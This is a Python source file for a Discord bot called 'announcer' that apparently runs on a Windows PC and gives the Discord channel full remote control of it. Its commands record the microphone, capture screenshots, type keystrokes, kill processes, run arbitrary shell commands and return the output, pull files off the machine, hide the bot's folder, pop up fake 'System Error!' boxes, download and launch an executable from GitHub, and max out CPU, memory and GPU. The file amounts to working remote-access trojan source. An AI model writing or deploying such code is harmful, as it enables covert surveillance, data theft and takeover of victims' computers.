from email.mime import message
import os
import discord
import asyncio
import requests
import pyautogui
from gtts import gTTS
import pygame
from dotenv import load_dotenv
from urllib.request import urlretrieve
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
import ctypes
import wave
from PIL import ImageGrab, Image, ImageTk
import tkinter as tk
from tkinter import messagebox
from threading import Thread
from tkvideo import tkvideo
from PIL import ImageGrab, Image, ImageTk
import time
import threading
import pyopencl as cl
import numpy as np

# Load token from .env
load_dotenv()
token = os.getenv("Ethan")
if not token:
    load_dotenv(dotenv_path='C:\\announcer\\.env')
    token = os.getenv("Ethan")
print(f"Token value: {token}")

clientName = os.environ.get('COMPUTERNAME', 'Unknown')
selectedClient = "None"

timeout = 1
command_mode = False



async def wifi_check():
    while True:
        try:
            requests.head("https://discord.com", timeout=timeout)
            print('The internet connection is active')
            break
        except requests.ConnectionError:
            print("The internet connection is down, retrying...")
            await asyncio.sleep(1)

# Run wifi check before starting the bot
asyncio.run(wifi_check())

class MyClient(discord.Client):
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.cancelled = False

    async def on_disconnect(self):
        print("Bot disconnected from Discord (possible internet loss).")

    async def on_resumed(self):
        print("Bot reconnected to Discord.")

    async def on_ready(self):
        print(f'Logged on as {self.user}!')
        await self.change_presence(activity=discord.Game(name="Started!"))
        await asyncio.sleep(3)
        await self.change_presence(activity=discord.Game(name="Online"))

    async def on_message(self, message):
        global command_mode
        if message.author == self.user:
            return
        try:
            
            if not command_mode:
                if message.content.startswith('client '):
                    global selectedClient
                    
                    if message.content[7:].strip() == 'list':
                        await message.channel.send(f'Current selected client: {selectedClient}\nAvailable clients: {clientName}')
                        return
                    
                    selectedClient = message.content[7:].strip()
                    await message.channel.send(f'Selected client set to {selectedClient}')
                    return
                
                if message.content == 'help':
                    help_message = (
                        "# PLEASE RUN client list to select a client\n"
                        "# you cannot use the program without selecting a client\n"
                        "## Available commands:\n"
                        "rec - Record audio\n"
                        "upd - Update the application\n"
                        "scr - Take a screenshot\n"
                        "tts - Text-to-speech\n"
                        "msg - Display a message box\n"
                        "lock - Lock the screen\n"
                        "key - Send keystrokes\n"
                        "close - Close a process\n"
                        "img - Display an image\n"
                        "vid - Display a video\n"
                        "sound - Play a sound\n"
                        "vol - Set the volume\n"
                        "shortcut - Press a shortcut\n"
                        "lag - Lag computer(CPU and RAM)\n"
                        "cmd - Run a command\n"
                        "cmdtoggle - Toggle command mode\n"
                        "hide - Hide the announcer folder\n"
                        "unhide - Unhide the announcer folder\n"
                        "help - Show this help message\n"
                    )
                    await message.channel.send(help_message)
                
                if not selectedClient != clientName and selectedClient != 'debug':
                    print(f'Message received for {selectedClient}, ignoring on {clientName}')
                    return
                
                if f'{message.content}' == 'cmdtoggle':
                   command_mode = True
                   await message.channel.send('Command mode enabled. Type "cmdtoggle" again to disable.')
                
                if message.content == 'cancel':
                    self.cancelled = True
                    await message.channel.send('Operation cancelled')
                    await asyncio.sleep(3)  # Give some time for ongoing operations to check the flag
                    self.cancelled = False # Reset for future operations
                    return
                    

                if message.content == 'rec':
                    def check(m):
                        return m.author == message.author and m.channel == message.channel

                    import pyaudio
                    p = pyaudio.PyAudio()
                    device_list = []
                    for i in range(p.get_device_count()):
                        info = p.get_device_info_by_index(i)
                        device_list.append(f"{i}: {info.get('name')}")
                    device_list_str = "\n".join(device_list)
                    with open('device_list.txt', 'w') as f:
                        f.write(device_list_str)
                    await message.channel.send(file=discord.File('device_list.txt'))
                    os.remove('device_list.txt')

                    await message.channel.send('Please enter the device index of the mic you would like to use')
                    msg = await self.wait_for('message', check=check)
                    device_index = int(msg.content)

                    await message.channel.send('How long would you like to record (in seconds)?')
                    msg = await self.wait_for('message', check=check)
                    record_seconds = int(msg.content)

                    chunk = 1024
                    sample_format = pyaudio.paInt32
                    channels = 1
                    rate = 44100

                    stream = p.open(format=sample_format,
                                    channels=channels,
                                    rate=rate,
                                    input=True,
                                    input_device_index=device_index,
                                    frames_per_buffer=chunk)

                    await message.channel.send(f'Recording for {record_seconds} seconds...')
                    frames = []
                    for _ in range(0, int(rate / chunk * record_seconds)):
                        if self.cancelled:
                            await message.channel.send('Recording operation cancelled.')
                            break
                        data = stream.read(chunk)
                        frames.append(data)

                    stream.stop_stream()
                    stream.close()
                    p.terminate()

                    wf = wave.open('output.wav', 'wb')
                    wf.setnchannels(channels)
                    wf.setsampwidth(p.get_sample_size(sample_format))
                    wf.setframerate(rate)
                    wf.writeframes(b''.join(frames))
                    wf.close()

                    await message.channel.send(file=discord.File('output.wav'))
                    os.remove('output.wav')

                # upd - Update the application
                if message.content == 'upd':
                    url = "https://github.com/Plexisity/announcer/raw/main/update.exe"
                    filename = "download.exe"
                    os.system("taskkill /f /im update.exe")
                    urlretrieve(url, filename)
                    if os.path.exists("update.exe"):
                        print("File already exists. Deleting it...")
                        await message.channel.send('"File already exists. Deleting it...')
                        os.remove("update.exe")
                    os.replace("download.exe", r".\update.exe")
                    os.startfile(r".\update.exe")
                    await message.channel.send('Updating...')
                    await self.change_presence(activity=discord.Game(name="Updating..."))

                # scr - Take a screenshot
                if message.content.startswith('scr'):
                    print('Taking screenshot(s)')
                    parts = message.content.strip().split()
                    if len(parts) == 2 and parts[1].isdigit():
                        amount = int(parts[1])
                        print(f'Taking {amount} screenshot(s)')
                        for i in range(amount):
                            if self.cancelled:
                                await message.channel.send('Screenshot operation cancelled.')
                                break
                            im = ImageGrab.grab(all_screens=True)
                            im.save('screenshot.png')
                            await message.channel.send(file=discord.File('screenshot.png'))
                            os.remove('screenshot.png')
                            await asyncio.sleep(1)
                        print('Screenshots taken')
                    else:
                        await message.channel.send('Incorrect syntax! Usage: scr <number>')

                # tts - Text-to-speech
                if message.content == 'tts':
                    await message.channel.send('Please enter the message you would like to send')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = await self.wait_for('message', check=check)
                    async def Playsound():
                        message_content = (msg.content)
                        player = gTTS(text=message_content, lang='en', slow=False)
                        player.save("msg.mp3")
                        pygame.mixer.init()
                        pygame.mixer.music.load("msg.mp3")
                        pygame.mixer.music.play()
                        while pygame.mixer.music.get_busy():
                            await asyncio.sleep(0.1)
                        pygame.mixer.music.unload()
                        os.remove("msg.mp3")
                    await Playsound()

                # msg - Display a message box
                if message.content == 'msg':
                    await message.channel.send('Please enter the message you would like to send')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = await self.wait_for('message', check=check)
                    if msg.content == 'cancel':
                        await message.channel.send('Message sending cancelled')
                        return
                    def Dialog_Box():
                        message_content = (msg.content)
                        root = tk.Tk()
                        root.withdraw()
                        root.attributes('-topmost', True)
                        messagebox.showinfo("System Error!", message_content)
                        root.destroy()
                    t2 = Thread(target=Dialog_Box)
                    t2.start()
                    t2.join()

                # lock - Lock the screen
                if message.content == 'lock':
                    os.system("rundll32.exe user32.dll,LockWorkStation")
                    await message.channel.send('Screen Locked')
                
                if startswith := message.content.startswith('lag'):
                    try:
                        _, seconds = message.content.split()
                        seconds = int(seconds)
                        await message.channel.send(f'Lagging for {seconds} seconds...')
                        #lag the system by using up ram and cpu for the duration
                        async def lag_system(duration):
                            await message.channel.send('Initialising GPU')
                            # Select first platform and device automatically
                            platforms = cl.get_platforms()
                            platform = platforms[0]
                            device = platform.get_devices()[0]
                            ctx = cl.Context([device])
                            queue = cl.CommandQueue(ctx)
                        
                            # Allocate ~1GB per buffer (256M floats * 4 bytes = 1GB)
                            size = 256 * 1024 * 1024
                            a_np = np.random.rand(size).astype(np.float32)
                            b_np = np.random.rand(size).astype(np.float32)
                        
                            a_g = cl.Buffer(ctx, cl.mem_flags.READ_ONLY | cl.mem_flags.COPY_HOST_PTR, hostbuf=a_np)
                            b_g = cl.Buffer(ctx, cl.mem_flags.READ_ONLY | cl.mem_flags.COPY_HOST_PTR, hostbuf=b_np)
                            res_g = cl.Buffer(ctx, cl.mem_flags.WRITE_ONLY, a_np.nbytes)
                        
                            kernel_code = """
                            __kernel void sum(__global const float *a, __global const float *b, __global float *res) {
                                int gid = get_global_id(0);
                                res[gid] = a[gid] + b[gid];
                            }
                            """
                            prg = cl.Program(ctx, kernel_code).build()
                            kernel = cl.Kernel(prg, "sum")
                            await message.channel.send('Complete, Starting lag operation...')
                            def cpu_stress():
                                
                                end_time = time.time() + duration
                                while time.time() < end_time:
                                    if self.cancelled:
                                        client.loop.create_task(message.channel.send('Lag operation cancelled.'))
                                        break
                                    pass

                            def memory_stress():
                                
                                a = []
                                end_time = time.time() + duration
                                while time.time() < end_time:
                                    a.append(' ' * 10**6)  # Allocate 1MB chunks
                            
                            def gpu_stress(duration=duration):
                                
                                end_time = time.time() + duration
                                while time.time() < end_time:
                                    # Run kernel multiple times per loop for more stress
                                    for _ in range(8):
                                        kernel.set_args(a_g, b_g, res_g)
                                        cl.enqueue_nd_range_kernel(queue, kernel, (size,), None)
                                    queue.finish()

                            cpu_thread = threading.Thread(target=cpu_stress)
                            memory_thread = threading.Thread(target=memory_stress)
                            gpu_thread = threading.Thread(target=gpu_stress)
                            await message.channel.send('Starting in')
                            await asyncio.sleep(1)
                            await message.channel.send('3')
                            await asyncio.sleep(1)
                            await message.channel.send('2')
                            await asyncio.sleep(1)
                            await message.channel.send('1')
                            await asyncio.sleep(1)
                            cpu_thread.start()
                            await message.channel.send('cpu thread started')
                            memory_thread.start()
                            await message.channel.send('memory thread started')
                            gpu_thread.start()
                            await message.channel.send('gpu thread started')
                            #send a message with countdown and edit it for the countodwn every second
                            countdown_message = await message.channel.send(f'Complete in {duration}')
                            for i in range(duration - 1, 0, -1):
                                await asyncio.sleep(1)
                                await countdown_message.edit(content=f'Complete in {i}')
                            await asyncio.sleep(1)
                            await countdown_message.edit(content='Lag complete!')
                            cpu_thread.join()
                            memory_thread.join()
                            gpu_thread.join()

                        await lag_system(seconds)
                        

                    except ValueError:
                        await message.channel.send('Invalid command format. Use "Lag <seconds>".')

                # key - Send keystrokes
                if message.content.startswith('key'):
                    await message.channel.send('Please enter the keystrokes you would like to send')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = await self.wait_for('message', check=check)
                    pyautogui.typewrite(msg.content)
                    await message.channel.send('Keystrokes sent')

                # close - Close a process
                if message.content == 'close':
                    os.system('tasklist > tasklist.txt')
                    await message.channel.send(file=discord.File('tasklist.txt'))
                    os.remove('tasklist.txt')
                    await message.channel.send('Please enter the process you would like to close')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = await self.wait_for('message', check=check)
                    await message.channel.send(f'Closing {msg.content}')
                    os.system(f'taskkill /f /im {msg.content}')

                # img - Show an image for half a second
                if message.content == 'img':
                    await message.channel.send('Please upload the image you would like to display')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel and m.attachments
                    msg = await self.wait_for('message', check=check)
                    attachment = msg.attachments[0]
                    await attachment.save('temp_image.png')
                    def show_image():
                        root = tk.Tk()
                        root.attributes('-topmost', True)
                        img = Image.open('temp_image.png')
                        img = ImageTk.PhotoImage(img)
                        panel = tk.Label(root, image=img)
                        panel.pack(side="top", fill="both", expand="yes")
                        root.after(500, lambda: root.destroy())
                        root.mainloop()
                    show_image()
                    os.remove('temp_image.png')

                # vid - Play a video (no audio)
                if message.content == 'vid':
                    await message.channel.send('Please upload the video you would like to display')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel and m.attachments
                    msg = await self.wait_for('message', check=check)
                    attachment = msg.attachments[0]
                    await attachment.save('temp_video.mp4')
                    # play video in tkinter window using tkvideo
                    def play_video():
                        root = tk.Tk()
                        root.attributes('-topmost', True)
                        label = tk.Label(root)
                        label.pack()
                        player = tkvideo("temp_video.mp4", label, loop=0, size=(640, 480))
                        player.play()
                        root.mainloop()
                    t1 = Thread(target=play_video)
                    t1.start()
                    t1.join()
                    os.remove('temp_video.mp4')

                # sound - Play a user defined sound
                if message.content == 'sound':
                    await message.channel.send('Please upload the sound you would like to play')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel and m.attachments
                    msg = await self.wait_for('message', check=check)
                    attachment = msg.attachments[0]
                    await attachment.save('temp_sound.mp3')
                    async def play_sound():
                        pygame.mixer.init()
                        pygame.mixer.music.load('temp_sound.mp3')
                        pygame.mixer.music.play()
                        while pygame.mixer.music.get_busy():
                            await asyncio.sleep(0.1)
                        pygame.mixer.music.unload()
                        os.remove('temp_sound.mp3')
                    await play_sound()

                # vol - Change volume
                if message.content == 'vol':
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(
                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume_interface = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
                    volume_interface.SetMute(0, None)
                    current_volume = volume_interface.GetMasterVolumeLevelScalar()
                    await message.channel.send(f'Current volume: {current_volume * 100}%')
                    await message.channel.send('Please enter the volume you would like to set (0-100)')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = await self.wait_for('message', check=check)
                    if msg.content == 'cancel':
                        await message.channel.send('Volume change cancelled')
                        return
                    volume = float(msg.content) / 100.0
                    volume_interface.SetMasterVolumeLevelScalar(volume, None)
                    await message.channel.send(f'Volume set to {msg.content}%')

                # help - Display help message
                

                # shortcut - Press a shortcut of the users choice
                if message.content.startswith('shortcut'):
                    shortcut = message.content[9:].strip()
                    if shortcut == ('help' or ''):
                        await message.channel.send('Usage: shortcut <keys> (e.g., shortcut ctrl+alt+del)')
                        return
                    keys = shortcut.split('+')
                    print(f'Pressing {keys}')
                    pyautogui.hotkey(*keys)
                    await message.channel.send(f'Shortcut {shortcut} pressed')


                # hide - Hide the announcer folder
                if message.content == 'hide':
                    os.system('attrib +h C:\\announcer')
                    await message.channel.send('Folder hidden')

                # unhide - Unhide the announcer folder
                if message.content == 'show':
                    os.system('attrib -h C:\\announcer')
                    await message.channel.send('Folder unhidden')

                if message.content == 'cmd':
                    await message.channel.send('Please enter the command you would like to run')
                    def check(m):
                        return m.author == message.author and m.channel == message.channel
                    msg = await client.wait_for('message', check=check)
                    if msg.content == 'cmdtoggle':
                        command_mode = True
                        await message.channel.send('Command mode enabled, type "cmdtoggle" to disable')
                    else:
                        os.system(msg.content)
                        await message.channel.send(f'Command "{msg.content}" executed, output was')
                        #send the output of the command
                        os.system(f'{msg.content} > output.txt')
                        await message.channel.send(file=discord.File('output.txt'))
            else:
                # In command mode: every message is treated as a shell command
                if f'{message.content}' == 'cmdtoggle':
                    command_mode = False
                    await message.channel.send('Command mode disabled.')
                elif message.content.strip().startswith('cd '):
                    # Handle 'cd' command in Python
                    path = message.content.strip()[3:].strip()
                    try:
                        os.chdir(path)
                        await message.channel.send(f'Changed directory to: {os.getcwd()}')
                    except Exception as e:
                        await message.channel.send(f'Failed to change directory: {e}')
                elif message.content.strip().startswith('download '):
                    file = message.content.strip()[9:].strip()
                    # send file to the channel
                    if os.path.exists(file):
                        await message.channel.send(file=discord.File(file))
                    else:
                        await message.channel.send(f'File "{file}" does not exist.')
                else:
                    os.system(f'{message.content} > C:/announcer/output.txt')
                    await message.channel.send(f'Command "{message.content}" executed, output was:')
                    await message.channel.send(file=discord.File('C:/announcer/output.txt'))
                    os.remove('C:/announcer/output.txt')

                

        except asyncio.CancelledError:
            await message.channel.send("Operation cancelled by user.")
        except Exception as e:
            await message.channel.send(f"An error occurred: {e}")


intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run(str(token))